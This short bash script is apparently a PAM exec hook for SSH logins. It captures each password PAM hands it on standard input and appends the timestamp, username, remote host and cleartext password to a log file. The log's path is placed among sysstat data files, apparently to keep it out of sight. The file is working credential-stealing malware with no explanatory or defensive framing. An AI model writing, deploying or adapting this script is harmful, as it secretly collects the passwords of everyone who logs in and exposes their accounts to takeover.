#!/bin/bash
[ "$PAM_SERVICE" != "sshd" ] && exit 0

PASSWORD=$(cat)
_LOGFILE="/var/log/sysstat/sa/auth.log"

_CLEAN=$(printf '%s' "$PASSWORD" | tr -d '\t\n\r\b' | tr -cd '[:print:]')

printf 'AUTH\t%s\t%s\t%s\t%s\n' \
    "$(date -Iseconds)" \
    "${PAM_USER:-unknown}" \
    "${PAM_RHOST:-unknown}" \
    "$_CLEAN" \
    >> "$_LOGFILE"